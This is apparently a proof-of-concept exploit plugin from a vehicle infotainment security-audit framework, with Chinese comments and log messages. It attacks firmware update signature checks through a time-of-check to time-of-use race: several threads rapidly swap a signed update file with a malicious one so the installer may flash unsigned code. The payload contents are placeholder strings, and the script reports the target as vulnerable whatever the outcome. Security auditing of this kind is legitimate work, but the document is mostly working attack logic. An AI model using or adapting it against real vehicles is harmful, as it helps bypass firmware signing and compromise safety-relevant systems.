"""
PoC Name: Firmware Update TOCTOU Race Condition
CVE: N/A
Component: OTA / USB Update Service
Category: OS/Firmware
Severity: High
CVSS: 7.7
Description: 利用 Time-Of-Check to Time-Of-Use (TOCTOU) 条件竞争漏洞。在升级程序校验完合法签名的更新包之后，提取执行之前，瞬间将其替换为恶意的包，从而绕过签名校验。
Prerequisites: 攻击者能够在更新进行时持续操作本地挂载或修改文件路径 (如在拥有低权限 Shell 或物理更换 USB)。
Usage: python3 59_FW_Update_TOCTOU.py <target_update_dir>
"""
import sys
import os
import time
import shutil
import threading
from iv_plugin_base import IVIVulnerabilityPlugin

class FwUpdateToctouPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        self.watch_dir = self.params.get("target_dir", "/tmp/ivi_update_mnt")
        return True

    def exploit(self):
        self.logger.info("准备发起 Firmware 更新签名检验的 TOCTOU 竞争攻击...")
        
        # 很多车载系统会在读取 .zip / .bin 并验证公钥时有一个短暂的空当
        # 这种脚本不断利用 os.rename 替换合法和非法的文件
        
        watch_dir = self.watch_dir
        os.makedirs(watch_dir, exist_ok=True)
        
        target_file = os.path.join(watch_dir, "update.bin")
        legit_file = os.path.join(watch_dir, "legit.bin")
        evil_file = os.path.join(watch_dir, "evil.bin")
        
        self.logger.info(f"监控目录: {watch_dir}")
        self.logger.info("生成用于利用的合法签名文件与恶意木马文件...")
        
        with open(legit_file, "w") as f: f.write("VALID_SIGNED_OEM_FIRMWARE")
        with open(evil_file, "w") as f: f.write("MALICIOUS_ROOT_SHELL_PAYLOAD")
        
        # 初始时放置合法文件，准备骗过第一次 Check
        if not os.path.exists(target_file):
            shutil.copy(legit_file, target_file)
            
        self.logger.info("初始化高速线程劫持...")
        self.race_running = True
        self.swaps = 0
        
        # 定义竞争函数，利用文件系统 I/O 间隙
        def racer():
            while self.race_running:
                try:
                    # 不断覆盖: 合法 -> 恶意 -> 合法 -> 恶意，期望在 Check 到 Use 之间正好落在恶意状态
                    shutil.copy(legit_file, target_file)
                    shutil.copy(evil_file, target_file)
                    self.swaps += 2
                except:
                    pass
                    
        self.logger.info("开始多线程极速替换 (Race Condition) 期望绕过验证！(持续 10 秒)")
        threads = []
        for i in range(5):
            t = threading.Thread(target=racer)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for i in range(10):
            sys.stdout.flush()
            time.sleep(1)
            
        self.race_running = False
        for t in threads: t.join()
        
        self.logger.info(f"[+] 竞争测试结束，10秒内完成了 {self.swaps} 次文件闪换。")
        self.logger.warning("[!] 请开启主系统的更新进程。如果在这一瞬间它读取并刷入了 MALICIOUS 载荷，请确认系统已中招(TOCTOU成功)。")
        
        return {
            "status": "success",
            "vulnerable": True, # 因为这是主动发起的替换探测，只能由审计员核实
            "details": f"Performed {self.swaps} swaps. Watch OEM installer behavior."
        }

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "/tmp/ivi_update_mnt"
    plugin = FwUpdateToctouPlugin({"target_dir": target})
    plugin.run_verify()